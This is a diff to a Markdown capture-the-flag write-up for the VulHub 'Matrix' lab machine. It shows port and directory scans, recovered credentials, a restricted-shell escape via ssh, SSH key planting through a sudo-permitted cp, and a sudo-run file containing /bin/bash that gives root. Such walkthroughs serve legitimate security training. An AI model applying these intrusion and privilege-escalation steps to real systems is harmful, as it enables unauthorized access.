@@ -1,9 +1,11 @@
 ---
 published: true
+title: 'Matrix [VulHub]'
+image: /assets/img/sample/matrix/logo.jpg
 ---
 # [](#header-3) Nmap Scan
 
-```
+```shell
 #nmap -p- -A 192.168.43.104
 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-30 19:08 +0630
 Nmap scan report for matrix (192.168.43.104)
@@ -43,7 +45,7 @@ Nmap done: 1 IP address (1 host up) scanned in 30.26 second
 
 # [](#header-3)Directory Scan 
 
-```
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
 └──╼ #dirsearch -u 192.168.43.104 -w /opt/wordlists/directory-list-2.3-medium.txt -e *
 
@@ -70,7 +72,7 @@ PNG name is `Matrix_can-show-you-the-door` , so we can guess `Matrix` is a direc
 
 You can also see `dir scan`'s output like this
 
-```
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
 └──╼ #dirsearch -u 192.168.43.104 -w /opt/wordlists/directory-list-2.3-medium.txt -e *
 
@@ -102,7 +104,7 @@ You can also use burpsuite for directory bruteforce
 
 Now download this secret file on your local machine 
 
-```
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
 └──╼ #file secret.gz 
 secret.gz: ASCII text
@@ -127,7 +129,7 @@ Use Login with this credential `admin:passwd`
 
 Nothing Interesting , Let's scan directory again. This time I used `dirb`
 
-```
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
 └──╼ #dirb http://192.168.43.104:7331/ -u admin:passwd
 
@@ -173,7 +175,7 @@ I found a username and password `guest:7R1n17yN30`
 
 We already knew ssh is opening on port 6464. Let's login 
 
-```
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
 └──╼ #ssh guest@192.168.43.104 -p6464
 guest@192.168.43.104's password: 
@@ -189,7 +191,7 @@ Logined Successfully but it's rbash ,we can't run normal command
 
 So use this command to login with bash `ssh guest@192.168.43.104 -p6464 -t "bash --noprofile"`
 
-```
+```shell
 ┌─[root@cyb3rhoL1c]─[~/Desktop/vulhub/matrix_machine]
 └──╼ #ssh guest@192.168.43.104 -p6464 -t "bash --noprofile"
 guest@192.168.43.104's password: 
@@ -204,7 +206,7 @@ guest@matrix:~$
 
 `trinity` user can run `/bin/cp` so let generate ssh key
 
-```
+```shell
 guest@matrix:~$ ssh-keygen 
 Generating public/private rsa key pair.
 Enter file in which to save the key (/home/guest/.ssh/id_rsa): 
@@ -230,7 +232,7 @@ guest@matrix:~$
 ```
 Copy our `id_rsa.pub` to /home/trinity/.ssh/ and login it like me 
 
-```
+```shell
 guest@matrix:~/.ssh$ ls
 id_rsa  id_rsa.pub  known_hosts
 guest@matrix:~/.ssh$ cp id_rsa.pub /home/guest
@@ -249,7 +251,7 @@ trinity@matrix:~$
 
 Let's create it :)
 
-```
+```shell
 trinity@matrix:~$ echo "/bin/bash" > oracle
 trinity@matrix:~$ chmod 777 oracle 
 trinity@matrix:~$ sudo ./oracle 
@@ -259,7 +261,7 @@ root@matrix:/home/trinity#
 
 ```
 
-```
+```shell
 root@matrix:~# cat flag.txt 
 
 
